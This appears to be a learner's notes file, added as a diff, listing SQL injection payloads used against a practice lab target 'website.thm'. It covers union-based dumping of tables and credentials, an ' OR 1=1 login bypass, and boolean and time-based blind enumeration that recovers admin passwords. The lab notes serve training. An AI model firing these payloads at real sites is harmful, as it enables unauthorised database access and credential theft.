@@ -1,0 +1,49 @@
+Error Based SQLi:
+https://website.thm/article?id=1 UNION SELECT 1,2,..
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,';',password SEPARATOR '<br>') FROM staff_users
+
+
+
+Blind SQLi - Authentication Bypass:
+password: ' OR 1=1;--
+
+
+
+Blind SQLi - Boolean Based:
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 WHERE database() like 's%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 WHERE database() like 'sqli_three%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' and table_name='users' and column_name like 'p%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' and table_name='users' and column_name like 'password%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin' and password like '3%';--
+https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin' and password like '3845%';--
+
+
+
+Blnid SQLi - Time Based
+database():
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
+table_schema = 'sqli_four'
+
+table_name:
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_four' and table_name like 'u%';--
+table_name = 'users'
+
+column_name:
+https://website.thm/analytics?referrer=aadmin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema='sqli_four' and column_name like 'u%';--
+column_name = 'username'
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema='sqli_four' and column_name='password';--
+column_name = 'password'
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username like 'a%';--
+username = 'admin'
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' and password like '4%';--
+password = '4961'
